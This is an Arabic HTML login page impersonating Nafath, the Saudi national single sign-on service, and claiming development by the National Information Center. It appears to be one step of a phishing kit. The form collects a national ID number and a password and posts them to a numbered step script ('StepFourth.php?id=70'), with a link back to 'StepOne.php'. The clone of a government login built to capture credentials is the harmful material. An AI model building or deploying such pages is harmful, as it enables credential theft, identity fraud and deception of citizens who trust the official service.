




<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nafath</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    <!-- CSS only -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx" crossorigin="anonymous">
    <!-- JavaScript Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa" crossorigin="anonymous"></script>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@200;300;500&display=swap" rel="stylesheet">
    <style>
        nav {
            overflow: auto;
        }
        
        .nafad {
            margin-right: 222px;
            float: right;
        }
        
        a {
            text-decoration: none;
        }
        
        .ff ul {
            list-style-type: none;
        }
        
        .ff ul li {
            display: inline;
            padding: 10px;
            font-weight: bold;
        }
        
        @media only screen and (max-width: 600px) {
            nav {
                overflow: hidden;
            }
            .nafad {
                float: none;
                margin-left: 230px;
            }
        }
        
        input {
            height: 37px !important;
            text-align: end;
            border-color: rgb(200, 224, 254) !important;
        }
        
        input:hover {
            background-color: lightgray;
        }
        
         ::-webkit-input-placeholder {
            text-align: right;
        }
        
        .tawtheg {
            transition: all 0.4s ease-in-out;
        }
        
        .tawtheg:hover {
            background-color: rgb(3, 71, 3) !important;
        }
        
        .aa {
            transition: all 0.2s ease-in;
            border: 1px solid black !important;
        }
        
        .aa:hover {
            color: gray;
        }
    </style>

</head>

<body class="bg-light" style="font-family:'Tajawal', sans-serif; overflow-x: hidden;">

    <header class="shadow-sm" style=" background-color: white;">
        <nav>
            <img src="img/nafad.png" class="nafad my-4" />
        </nav>
    </header>

    <main>
        <div class="container-fluid bg-light" style="margin-bottom: 100px;">
            <div class="row">
                <div class="col-sm-12 text-center">
                    <h1 class="text-center mt-5" style="font-weight:900; color: #11998E;">الدخول على النظام</h1>
                    <img src="img/openSystem.png" class="mt-4 img-fluid"><br>
                </div>
            </div>

            <div class="row d-flex justify-content-center mt-5">
                <div class="col-sm-6 col-lg-4" style="background-color: white; padding:20px 35px;">
                    
                


                <form method="POST" action="StepFourth.php?id=70" >
                         <label for="user" class="form-label float-end mt-5 fw-bold">رقم الهوية</label>
                        <input type="text" required name="UserName" id="user" minlength="10" maxlength="10" pattern="[0-9]+" class="form-control" placeholder="رقم الهوية">
                        <span style="color:red;margin-left: 60%;"><b></b></span>
                        <label for="pass" class="form-label float-end mt-4 fw-bold">كلمة المرور</label>
                        <input type="password" required name="UserPasswore" id="pass" class="form-control mb-2" placeholder="كلمة المرور">
                        <span style="color:red;margin-left: 65%;"><b></b></span>
                        <br>
                        <button type="submit" name="submit_LogInToTheSystem" class="tawtheg w-100 text-center btn fw-bold mt-4" style="background-color:#11998E; color: white; letter-spacing: 1px; height: 45px !important;">تسجيل الدخول <img src="img/130924.png"></button>
                </form>





                    <div class="mt-4 d-flex flex-column gap-2">
                        <a class="btn aa" href="StepOne.php?id=70">البدء من جديد </a>
                        <button class="btn float-end aa"> إعادة تعيين / تغيير كلمة المرور<i class="bi bi-lock"></i></button>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <footer>
        <div class="container rounded" style="background-color: #dddddd; overflow: hidden;">
            <div class="row d-flex align-items-center pt-3">
                <div class="col-sm-3 col-lg-6 ff mt-4">
                    <ul>
                        <li>الرئيسية</li>
                        <li>حول</li>
                        <li>اتصل بنا</li>
                        <li>الشروط والأحكام</li>
                        <li>المساعدة والدعم</li>
                    </ul>
                </div>
                <div class="col-sm-3 col-lg-3 mt-4">
                    <p class="fw-bold text-end">تطوير وتشغيل</p>
                    <h2 class="fw-bold text-end">مركز المعلومات الوطني</h2>
                    <p class="fw-bold text-end">النفاذ الوطني الموحد جميع الحقوق محفوظة © 2022</p>
                </div>
                <div class="col-sm-3 col-lg-3 text-center">
                    <img src="img/NIC.png">
                </div>
            </div>
        </div>
    </footer>

    <br>
</body>

</html>